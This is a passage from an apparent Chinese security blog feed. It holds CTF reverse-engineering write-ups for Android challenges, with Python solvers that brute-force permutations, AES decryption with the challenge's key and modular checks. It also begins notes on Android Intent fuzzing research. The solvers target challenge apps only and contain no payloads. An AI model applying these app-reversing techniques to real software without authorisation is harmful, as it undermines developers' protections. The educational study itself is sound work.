class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&quot;51234&quot;</span>:<span class="string">&quot;127&quot;</span>, <span class="string">&quot;1234&quot;</span>:<span class="string">&quot;126&quot;</span>, <span class="string">&quot;5234&quot;</span>:<span class="string">&quot;125&quot;</span>, <span class="string">&quot;234&quot;</span>:<span class="string">&quot;124&quot;</span>, <span class="string">&quot;5134&quot;</span>:<span class="string">&quot;123&quot;</span>, <span class="string">&quot;134&quot;</span>:<span class="string">&quot;122&quot;</span>, <span class="string">&quot;534&quot;</span>:<span class="string">&quot;121&quot;</span>, <span class="string">&quot;34&quot;</span>:<span class="string">&quot;120&quot;</span>, <span class="string">&quot;5124&quot;</span>:<span class="string">&quot;119&quot;</span>, <span class="string">&quot;124&quot;</span>:<span class="string">&quot;118&quot;</span>, <span class="string">&quot;524&quot;</span>:<span class="string">&quot;117&quot;</span>, <span class="string">&quot;24&quot;</span>:<span class="string">&quot;116&quot;</span>, <span class="string">&quot;514&quot;</span>:<span class="string">&quot;115&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;114&quot;</span>, <span class="string">&quot;54&quot;</span>:<span class="string">&quot;113&quot;</span>, <span class="string">&quot;4&quot;</span>:<span class="string">&quot;112&quot;</span>, <span class="string">&quot;5123&quot;</span>:<span class="string">&quot;111&quot;</span>, <span class="string">&quot;123&quot;</span>:<span class="string">&quot;110&quot;</span>, <span class="string">&quot;523&quot;</span>:<span class="string">&quot;109&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;108&quot;</span>, <span class="string">&quot;513&quot;</span>:<span class="string">&quot;107&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;106&quot;</span>, <span class="string">&quot;53&quot;</span>:<span class="string">&quot;105&quot;</span>, <span class="string">&quot;3&quot;</span>:<span class="string">&quot;104&quot;</span>, <span class="string">&quot;512&quot;</span>:<span class="string">&quot;103&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;102&quot;</span>, <span class="string">&quot;52&quot;</span>:<span class="string">&quot;101&quot;</span>, <span class="string">&quot;2&quot;</span>:<span class="string">&quot;100&quot;</span>, <span class="string">&quot;51&quot;</span>:<span class="string">&quot;99&quot;</span>, <span class="string">&quot;1&quot;</span>:<span class="string">&quot;98&quot;</span>, <span class="string">&quot;5&quot;</span>:<span class="string">&quot;97&quot;</span>&#125;</span><br><span class="line">aim = <span class="string">&quot;52405201052052301230540405120140305240&quot;</span> </span><br><span class="line">AIM =<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">pos, path=<span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    <span class="keyword">global</span> AIM</span><br><span class="line">    <span class="comment"># print(pos, path)</span></span><br><span class="line">    <span class="keyword">if</span>(pos &gt;= <span class="built_in">len</span>(aim)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find: &quot;</span> , path)</span><br><span class="line">        AIM = path.upper()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pos+<span class="number">1</span>, <span class="built_in">len</span>(aim) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(aim[pos:i] <span class="keyword">in</span> d <span class="keyword">and</span> aim[i]==<span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">            dfs(i+<span class="number">1</span>, path + <span class="built_in">chr</span>(<span class="built_in">int</span>(d[ aim[pos:i] ])) )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    <span class="comment"># aim = &quot;UEBEMNQPGRHU&quot;</span></span><br><span class="line">    <span class="keyword">global</span> AIM</span><br><span class="line">    aim = AIM</span><br><span class="line">    adv = [<span class="number">3</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">10</span>]</span><br><span class="line">    mat = [</span><br><span class="line">        <span class="string">&quot;MTURVPYCJGZOQNKASEWFIXBHLD&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CKTUVBXSAFJDGHIMNYZOPQRWEL&quot;</span>,</span><br><span class="line">        <span class="string">&quot;WXOPZGNVYDEFIJCBKARLUQHMST&quot;</span>,</span><br><span class="line">        <span class="string">&quot;FBSNOPMACKDRQITUVWHZLJXYGE&quot;</span>,</span><br><span class="line">        <span class="string">&quot;OMEJCXYFZBQRAPGSDTINKLUHVW&quot;</span>,</span><br><span class="line">        <span class="string">&quot;XASQGMTFIRBVHEJUOCDYZPKLNW&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EHWUVRYOPQSIBXJACTZGMNDFLK&quot;</span>,</span><br><span class="line">        <span class="string">&quot;VWNIKAXMOGHLZBRDQJEUYFPCST&quot;</span>,</span><br><span class="line">        <span class="string">&quot;FDXYUKOPJMBCZLIGNVWSTEHAQR&quot;</span>,</span><br><span class="line">        <span class="string">&quot;NSKBRTUZEJOPGHIFXCDAVWQYLM&quot;</span>,</span><br><span class="line">        <span class="string">&quot;CLYMVHXASTKNWIUOPZJDBQGREF&quot;</span>,</span><br><span class="line">        <span class="string">&quot;AYTNCBDRSQLZWXOPKJGEHIMFUV&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;FLAG: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> ind <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">        s = mat[adv[ind] -<span class="number">1</span>]</span><br><span class="line">        indexx = s.index(aim[ind])</span><br><span class="line">        align_index = (indexx - <span class="number">9</span> + <span class="number">26</span>) % <span class="number">26</span></span><br><span class="line">        <span class="built_in">print</span>(s[align_index], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dfs(<span class="number">0</span>)</span><br><span class="line">decode()</span><br></pre></td></tr></table></figure><h1 id="mobileC"><a href="#mobileC" class="headerlink" title="mobileC"></a>mobileC</h1><p>又是一道native逻辑看起来很复杂但是整体算法很简单的题，总的来说多动态调试做得快些。</p><p>Java层比较直接，把flag抠出来AES加密一下再转base64得到flagCipher，这个过程的密钥和偏移是固定的。然后把flagCipher和flag本身传到native层的GetStr()函数中，检查返回值是不是”MEH33iZwnESCmAv=ryydXY3=hcRZbjB=7Fd22n3=lFN3DmP=”。</p><p>在native层，GetStr函数其实被动态注册替换成了GetStrcT，要去JNI_OnLoad中找对函数才能动态调试。（难怪一开始IDA动态调试老是断不下来）</p><p>在GetStrcT中，乍一看逻辑是非常的复杂，而且IDA还原得也不是很好。很多变量前后的符号不一致，静态分析起来很烧脑。此时就需要多用动态调试，关注flagCipher和flag的值传递到了哪些变量中。</p><p>总的来说，对于flag，算法先去找”_“符号，然后取”_“之后的6个byte，所以flag是ISCC{xxxxxx_yyyyyyyy}的形式。这6个byte应该对应ascii的0-5，如果不是这个范围会调整为’1’，然后经过vmovl_u16、vmovl_u8这类指令变换为对应的数字0-5，记作key[6]。（因为是动态调试观察结果，所以具体的运算过程没有去关心）</p><p>对于flagCipher，它是AES+base64过后的形式，先添加”=”把长度补成6的倍数，然后重新排列。因为Java层的目标值是48位，所以flagCipher补足之后也该是48位。先把flagCipher分割成6byte x 8clip，然后枚举0&lt;=key[i]&lt;6，把8clip中的第key[i]位取出来依次连接在一起。以key=[0,0,1,2,3,4]为例，重排前后的值如下图所示。</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20220520145459.png" alt="image-20220520145452327"></p><p>现在，反过来从”MEH33iZwnESCmAv=ryydXY3=hcRZbjB=7Fd22n3=lFN3DmP=”逆推。因为这个字符串内部没有重复，所以key是012345的全排列。我们枚举所有的全排列，然后按照算法还原为flagCipher，然后去掉末尾的”====”检查是不是base64的格式，接着用AES去解密，最后看看解出来的flag中”_”之后的6个byte是否和key对得上。事实上，因为AES算法的原因，只需要检查当前还原的flagCipher是否能够成功解密即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">from</span>  Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools <span class="keyword">as</span> it</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;MEH33iZwnESCmAv=ryydXY3=hcRZbjB=7Fd22n3=lFN3DmP=&quot;</span></span><br><span class="line">s = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">px = [ i <span class="keyword">for</span>  i <span class="keyword">in</span> it.permutations(s, <span class="number">6</span>)]</span><br><span class="line">cipherList = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCipherList</span>():</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> px:</span><br><span class="line">        plain = [<span class="string">&quot;=&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>)]</span><br><span class="line">        pp = <span class="built_in">list</span>(p)</span><br><span class="line">        ind = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ind1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            <span class="keyword">for</span> ind2 <span class="keyword">in</span> <span class="built_in">range</span>(pp[ind1], <span class="number">48</span>, <span class="number">6</span>):</span><br><span class="line">                plain[ind2] = c[ind]</span><br><span class="line">                ind += <span class="number">1</span></span><br><span class="line">                <span class="comment"># print(&quot;(%d)&quot; % (ind))</span></span><br><span class="line">        ci = <span class="string">&quot;&quot;</span>.join(plain)</span><br><span class="line">        <span class="keyword">if</span>(ci[-<span class="number">5</span>:] == <span class="string">&quot;=====&quot;</span>):</span><br><span class="line">            cipherList.append(ci[<span class="number">0</span>:-<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> cipherList</span><br><span class="line"></span><br><span class="line"><span class="comment">#AES轮子来自 https://blog.51cto.com/u_14246112/3231470</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PrpCrypt</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key</span>):</span></span><br><span class="line">        self.key = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        self.mode = AES.MODE_CBC</span><br><span class="line">        <span class="comment"># self.iv = Random.new().read(AES.block_size)</span></span><br><span class="line">        self.iv = <span class="built_in">bytes</span>(<span class="string">&quot;aUBTJjg4Q2NDLg==&quot;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(type(self.iv), type(self.key), type(self.mode), self.mode)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密函数，如果text不足16位就用空格补足为16位，</span></span><br><span class="line">    <span class="comment"># 如果大于16当时不是16的倍数，那就补足为16的倍数。</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        text = text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line">        cryptor = AES.new(self.key, self.mode,self.iv)</span><br><span class="line">        <span class="comment"># 这里密钥key 长度必须为16（AES-128）,</span></span><br><span class="line">        <span class="comment"># 24（AES-192）,或者32 （AES-256）Bytes 长度</span></span><br><span class="line">        <span class="comment"># 目前AES-128 足够目前使用</span></span><br><span class="line">        length = <span class="number">16</span></span><br><span class="line">        count = <span class="built_in">len</span>(text)</span><br><span class="line">        <span class="keyword">if</span> count &lt; length:</span><br><span class="line">            add = (length - count)</span><br><span class="line">            <span class="comment"># \0 backspace</span></span><br><span class="line">            <span class="comment"># text = text + (&#x27;\0&#x27; * add)</span></span><br><span class="line">            text = text + (<span class="string">&#x27;\0&#x27;</span> * add).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">elif</span> count &gt; length:</span><br><span class="line">            add = (length - (count % length))</span><br><span class="line">            <span class="comment"># text = text + (&#x27;\0&#x27; * add)</span></span><br><span class="line">            text = text + (<span class="string">&#x27;\0&#x27;</span> * add).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line">        self.ciphertext = cryptor.encrypt(text)</span><br><span class="line">        <span class="comment"># 因为AES加密时候得到的字符串不一定是ascii字符集的，输出到终端或者保存时候可能存在问题</span></span><br><span class="line">        <span class="comment"># 所以这里统一把加密后的字符串转化为16进制字符串</span></span><br><span class="line">        <span class="keyword">return</span> b2a_hex(self.ciphertext)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        cryptor = AES.new(self.key, self.mode, self.iv)</span><br><span class="line">        plain_text = cryptor.decrypt(a2b_hex(text))</span><br><span class="line">        <span class="comment"># return plain_text.rstrip(&#x27;\0&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pc = PrpCrypt(<span class="string">&#x27;QERAPG9dPyZfTC5f&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ciphers = getCipherList()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ci <span class="keyword">in</span> ciphers:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            e = b2a_hex(base64.b64decode(ci))</span><br><span class="line">            d = pc.decrypt(e).encode() <span class="comment"># 解密</span></span><br><span class="line">            <span class="built_in">print</span>(ci,d)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="EasyCryMobile"><a href="#EasyCryMobile" class="headerlink" title="EasyCryMobile"></a>EasyCryMobile</h1><p>apk要求Android12L，似乎是难以满足的，所以只能静态分析。isccgetflag54下面的3个activity各自有一些校验逻辑，抠出来逆一下就好。第3个activity用用z3求解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">x, aim</span>):</span></span><br><span class="line">    tmp = x*x</span><br><span class="line">    <span class="keyword">if</span>(x*x &gt;= <span class="number">0xf619</span>):</span><br><span class="line">        tmp = x*x + <span class="number">0x9e7</span></span><br><span class="line">    <span class="keyword">return</span> aim == tmp * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span></span><br><span class="line"></span><br><span class="line">aims = [<span class="number">42349</span>, <span class="number">12496</span>, <span class="number">33079</span>, <span class="number">33079</span>, <span class="number">44552</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> aim <span class="keyword">in</span> aims:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>(check(i, aim)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aims2 = [<span class="number">7101</span>, <span class="number">13899</span>, <span class="number">18708</span>, <span class="number">556</span>, <span class="number">1168</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span>(<span class="params">x, aim</span>):</span></span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">149</span>):</span><br><span class="line">        tmp = tmp * x % <span class="number">37523</span></span><br><span class="line">    <span class="keyword">return</span> tmp == aim</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> aim <span class="keyword">in</span> aims2:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>(check2(i, aim)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">fi</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (fi * fi - <span class="number">31921</span> * (((<span class="number">16819</span> * fi * fi) &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">13</span>)) * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span></span><br><span class="line"></span><br><span class="line">s = [<span class="number">23598</span>, <span class="number">16034</span> , <span class="number">20727</span> , <span class="number">20727</span> , <span class="number">13486</span>, <span class="number">2231</span> , <span class="number">5750</span> , <span class="number">6799</span>, <span class="number">21861</span>, <span class="number">1528</span> , <span class="number">24635</span> , <span class="number">6799</span> , <span class="number">20754</span> , <span class="number">17756</span> , <span class="number">27966</span> , <span class="number">10529</span> ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span>(calc(x) == i):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># int8_2 = BitVec(&#x27;int8_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int8_1 = BitVec(&#x27;int8_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int6_2 = BitVec(&#x27;int6_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int6_1 = BitVec(&#x27;int6_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int1_2 = BitVec(&#x27;int1_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int1_1 = BitVec(&#x27;int1_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int7_2 = BitVec(&#x27;int7_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int7_1 = BitVec(&#x27;int7_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int2_1 = BitVec(&#x27;int2_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int5_2 = BitVec(&#x27;int5_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int5_1 = BitVec(&#x27;int5_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int3_1 = BitVec(&#x27;int3_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int2_2 = BitVec(&#x27;int2_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int4_2 = BitVec(&#x27;int4_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int4_1 = BitVec(&#x27;int4_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int3_2 = BitVec(&#x27;int3_2&#x27;, 32)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s.add( int6_2 ^ int7_2 ^ 0x5FD3 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int7_1 ^ int5_1 ^ 0x477 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int7_2 ^ int4_2 ^ int1_2 ^ 0x6171 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int8_2 ^ int5_2 ^ 0x2CD9 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int6_1 ^ int8_1 ^ 0xD05 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int5_2 ^ int6_2 ^ 0x1F77 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int7_1 ^ 0x5112 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int8_1 ^ 0x6D3E == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int3_2 ^ int8_2 ^ int5_2 ^ 0x246E == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int3_1 ^ int1_1 ^ 0x6880 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int4_2 ^ int1_2 ^ 0x242D == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int2_1 ^ int4_1 ^ 0x4681 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int1_2 ^ int2_2 ^ 0x6E55 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int3_1 ^ 0x34AE == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int2_2 ^ int3_2 ^ int8_2 ^ int5_2 ^ 0x7499 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int4_1 ^ 0x1676 == 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if(s.check() == sat):</span></span><br><span class="line"><span class="comment">#     print(s.model())</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;北京理工大学信息系统及安全对抗实验中心 2022年第19届信息安全与对抗技术竞赛 部分逆向题&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Android Intent Fuzz论文阅读笔记</title>
    <link href="http://slient2009.github.io/2022/04/01/Android-Intent-Fuzz/"/>
    <id>http://slient2009.github.io/2022/04/01/Android-Intent-Fuzz/</id>
    <published>2022-04-01T04:00:00.000Z</published>
    <updated>2022-12-17T09:09:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>Android Intent Fuzz类论文阅读笔记，以及相关工具、代码和介绍</p><span id="more"></span><h2 id="2013-DroidFuzzer"><a href="#2013-DroidFuzzer" class="headerlink" title="2013-DroidFuzzer"></a>2013-DroidFuzzer</h2><blockquote><p>DroidFuzzer: Fuzzing the Android Apps with Intent-Filter Tag</p><p>文章提出了一种借助Intent-filter的fuzz安卓应用的框架，主要面向接收外来MIME数据的Activity，也即注册了相应的intent-filter的Activity。</p><p>In <em>Proceedings of International Conference on Advances in Mobile Computing &amp; Multimedia</em> (pp. 68-74).</p></blockquote><h3 id="相关框架介绍"><a href="#相关框架介绍" class="headerlink" title="相关框架介绍"></a>相关框架介绍</h3><p><strong>Monkey</strong>:运行在模拟器或者设备上的压力测试工具，可以模拟用户事件（点击、滑动、按压）和一些系统级事件。</p><p><strong>MonkeyRunner</strong>:提供API，可以通过编写脚本控制设备和测试过程，常用于功能测试和回归测试，但是也只能模拟用户事件。</p><p><strong>DroidPilot</strong>:通过模拟器或者设备，可以获取UI对象，支持脚本化测试，支持同时在大量的设备上进行测试，常用于UI测试。</p><p><strong>iTestin</strong>:可以记录在一台设备上的脚本测试，然后部署到其他的设备上，用于大规模的设备测试和回归测试。</p><p><strong>Robotium</strong>:基于Android Instrumentation，该测试框架使得编写强大而鲁棒的自动化UI测试脚本更加容易。</p><p><em>上述框架都聚焦于UI测试</em></p><p><strong>Dynodroid</strong>:通过生成相关的用户事件输入给App来进行fuzz，同时可以以一种轻量的方法监控App对输入用户事件的反应。</p><p>还有一些其他的fuzz切入点，例如SMS、NFC、binder。</p><h3 id="DroidFuzzer设计"><a href="#DroidFuzzer设计" class="headerlink" title="DroidFuzzer设计"></a>DroidFuzzer设计</h3><p>Android有四大组件：Activity、Broadcast Receiver、Service、Content Provider。</p><p>Activity自然是App与用户交互的主要接口，同时Intent又是Activity之间交互的主要方式，所以选择通过Fuzz Intent的手段来测试App。<br>按照作者的表述，Activity是App的“核心”，Intent是Activity接收的输入数据，那么Intent也就可以视作App的输入，于是就通过Fuzz Intent的方式来测试整个App。</p><p>DroidFuzzer是灰盒的，除了确定哪些Activity接收Intent之外，不再关心更为具体的内部信息。可以分为预处理、变异和动态检测三个模块，</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20211214201802.png" alt="image-20211214145729111"></p><h4 id="预处理模块"><a href="#预处理模块" class="headerlink" 